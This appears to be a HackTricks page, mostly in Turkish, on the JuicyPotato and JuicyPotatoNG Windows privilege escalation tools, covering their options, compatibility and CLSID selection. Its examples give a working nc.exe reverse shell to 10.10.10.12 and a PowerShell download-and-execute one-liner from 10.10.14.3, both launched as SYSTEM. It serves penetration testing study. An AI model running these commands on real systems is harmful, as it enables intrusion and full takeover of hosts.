# JuicyPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING] > JuicyPotato eski bir araçtır. Genellikle Windows 10 1803 / Windows Server 2016'ya kadar olan sürümlerde çalışır. Microsoft'un Windows 10 1809 / Server 2019 ve sonrası için getirdiği değişiklikler orijinal tekniği bozdu. Bu derlemeler ve daha yenileri için PrintSpoofer, RoguePotato, SharpEfsPotato/EfsPotato, GodPotato gibi modern alternatifleri düşünün. Güncel seçenekler ve kullanım için aşağıdaki sayfaya bakın.


{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Juicy Potato (yüksek ayrıcalıkları kötüye kullanma) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_A sugared version of_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, with a bit of juice, i.e. **another Local Privilege Escalation tool, from a Windows Service Accounts to NT AUTHORITY\SYSTEM**_

#### juicypotato'ı şu adresten indirebilirsiniz [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Uyumluluk kısa notlar

- Geçerli bağlamda SeImpersonatePrivilege veya SeAssignPrimaryTokenPrivilege olduğunda Windows 10 1803 ve Windows Server 2016'ya kadar güvenilir şekilde çalışır.
- Windows 10 1809 / Windows Server 2019 ve sonrası için Microsoft'un sertleştirmesi tarafından bozulmuştur. Bu sürümler için yukarıda bağlantılı alternatifleri tercih edin.

### Özet <a href="#summary" id="summary"></a>

[**From juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) and its [variants](https://github.com/decoder-it/lonelypotato) ayrıcalık yükseltme zincirini [`BITS`](<https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799(v=vs.85).aspx>) [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) üzerinde 127.0.0.1:6666 adresinde MiTM dinleyicisi olması ve sizin `SeImpersonate` veya `SeAssignPrimaryToken` ayrıcalıklarına sahip olmanız durumunda kullanır. Bir Windows derleme incelemesi sırasında `BITS` kasıtlı olarak devre dışı bırakılmış ve 6666 portu kullanımda bulunduğu bir yapılandırma bulduk.

RottenPotatoNG'yi silahlandırmaya karar verdik: **Say hello to Juicy Potato**.

> For the theory, see [Rotten Potato - Privilege Escalation from Service Accounts to SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) and follow the chain of links and references.

BITS dışında kötüye kullanabileceğimiz birkaç COM sunucusu olduğunu keşfettik. Bunların sadece şunlara sahip olması gerekiyor:

1. mevcut kullanıcı tarafından örneklendirilebilmeli; genelde impersonation privileges'e sahip bir “service user”
2. `IMarshal` arabirimini uygulamak
3. yükseltilmiş bir kullanıcı olarak çalışmak (SYSTEM, Administrator, …)

Biraz test sonrası birkaç Windows sürümünde [interesting CLSID’s](http://ohpe.it/juicy-potato/CLSID/) içeren kapsamlı bir liste elde ettik ve test ettik.

### Juicy details <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato size şunları yapma imkanı verir:

- **Target CLSID** _istediğiniz herhangi bir CLSID'i seçin._ [_Here_](http://ohpe.it/juicy-potato/CLSID/) _işletim sistemine göre düzenlenmiş listeyi burada bulabilirsiniz._
- **COM Listening port** _tercih ettiğiniz COM dinleme portunu tanımlayın (marshalled hardcoded 6666 yerine)_
- **COM Listening IP address** _sunucuyu herhangi bir IP'ye bağlayın_
- **Process creation mode** _taklit edilen kullanıcının ayrıcalıklarına bağlı olarak şu seçeneklerden birini seçebilirsiniz:_
  - `CreateProcessWithToken` (needs `SeImpersonate`)
  - `CreateProcessAsUser` (needs `SeAssignPrimaryToken`)
  - `both`
- **Process to launch** _sömürme başarılı olursa bir yürütülebilir dosya veya betik başlatın_
- **Process Argument** _başlatılan prosesin argümanlarını özelleştirin_
- **RPC Server address** _gizli bir yaklaşım için harici bir RPC sunucusuna kimlik doğrulayabilirsiniz_
- **RPC Server port** _harici bir sunucuya kimlik doğrulamak istiyor ve firewall `135` portunu engelliyorsa faydalıdır…_
- **TEST mode** _çoğunlukla test amaçlı, ör. CLSID'leri test etmek için. DCOM'u oluşturur ve token sahibinin kullanıcı bilgisini yazdırır. See_ [_here for testing_](http://ohpe.it/juicy-potato/Test/)

### Kullanım <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Son düşünceler <a href="#final-thoughts" id="final-thoughts"></a>

[**juicy-potato Readme'den**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**

Kullanıcının `SeImpersonate` veya `SeAssignPrimaryToken` ayrıcalıkları varsa, o zaman **SYSTEM**'siniz.

Tüm bu COM Servers'ın suistimalini engellemek neredeyse imkansız. Bu nesnelerin izinlerini `DCOMCNFG` ile değiştirmeyi düşünebilirsiniz ama iyi şanslar, bu zor olacak.

Gerçek çözüm, `* SERVICE` hesapları altında çalışan hassas hesapları ve uygulamaları korumaktır. `DCOM`'u durdurmak kesinlikle bu exploit'i engeller ama alttaki OS üzerinde ciddi etkileri olabilir.

Kaynak: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## JuicyPotatoNG (2022+)

JuicyPotatoNG, modern Windows üzerinde JuicyPotato-style local privilege escalation'ı şu öğeleri birleştirerek yeniden tanıtıyor:
- DCOM OXID resolution'ı seçilen bir portta yerel bir RPC server'a yönlendirerek, eski hardcoded 127.0.0.1:6666 dinleyicisinden kaçınma.
- Giriş yapan SYSTEM kimlik doğrulamasını yakalamak ve taklit etmek için bir SSPI hook; RpcImpersonateClient gerektirmeden çalışır, bu aynı zamanda sadece SeAssignPrimaryTokenPrivilege mevcutken CreateProcessAsUser'ı mümkün kılar.
- DCOM aktivasyon kısıtlamalarını karşılamak için taktikler (ör. PrintNotify / ActiveX Installer Service sınıflarını hedeflerken önceki INTERACTIVE-group gereksinimi).

Önemli notlar (sürümler arasında değişen davranışlar):
- Eylül 2022: İlk teknik, “INTERACTIVE trick”i kullanarak desteklenen Windows 10/11 ve Server hedeflerinde çalışıyordu.
- Ocak 2023 yazar güncellemesi: Microsoft daha sonra INTERACTIVE trick'i engelledi. Farklı bir CLSID ({A9819296-E5B3-4E67-8226-5E72CE9E1FB7}) exploitation'ı geri getiriyor ancak gönderilerine göre yalnızca Windows 11 / Server 2022'de.

Temel kullanım (yardımda daha fazla bayrak var):
```
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
# Useful helpers:
#  -b  Bruteforce all CLSIDs (testing only; spawns many processes)
#  -s  Scan for a COM port not filtered by Windows Defender Firewall
#  -i  Interactive console (only with CreateProcessAsUser)
```
Eğer hedefiniz klasik JuicyPotato'nun yamalandığı Windows 10 1809 / Server 2019 ise, en üstte bağlantılı alternatifleri tercih edin (RoguePotato, PrintSpoofer, EfsPotato/GodPotato, etc.). NG, build ve servis durumuna göre durumsal olabilir.

## Örnekler

Not: Denemek için CLSID listesini görmek üzere [this page](https://ohpe.it/juicy-potato/CLSID/) ziyaret edin.

### nc.exe ile reverse shell alın
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell ters
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Launch a new CMD (if you have RDP access)

![](<../../images/image (300).png>)

## CLSID Problems

Çoğunlukla JuicyPotato'nun kullandığı varsayılan CLSID **çalışmaz** ve exploit başarısız olur. Genellikle bir **çalışan CLSID** bulmak için birden fazla deneme gerekir. Belirli bir işletim sistemi için denenebilecek CLSID'lerin bir listesini almak için şu sayfayı ziyaret edin:

- [https://ohpe.it/juicy-potato/CLSID/](https://ohpe.it/juicy-potato/CLSID/)

### **Checking CLSIDs**

Öncelikle juicypotato.exe dışında bazı yürütülebilir dosyalara ihtiyacınız olacak.

Join-Object.ps1'i indirip PS oturumunuza yükleyin ve GetCLSID.ps1'i indirip çalıştırın. Bu script test edilecek olası CLSID'lerin bir listesini oluşturacaktır.

Ardından test_clsid.bat'i indirin (CLSID listesinin ve juicypotato yürütülebilir dosyasının yolunu değiştirin) ve çalıştırın. Bu, her CLSID'yi denemeye başlayacak ve **port numarası değiştiğinde, CLSID'nin çalıştığı anlamına gelecektir**.

**-c parametresini kullanarak** çalışan CLSID'leri **kontrol edin**

## References

- [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)
- [Giving JuicyPotato a second chance: JuicyPotatoNG (decoder.it)](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)

{{#include ../../banners/hacktricks-training.md}}
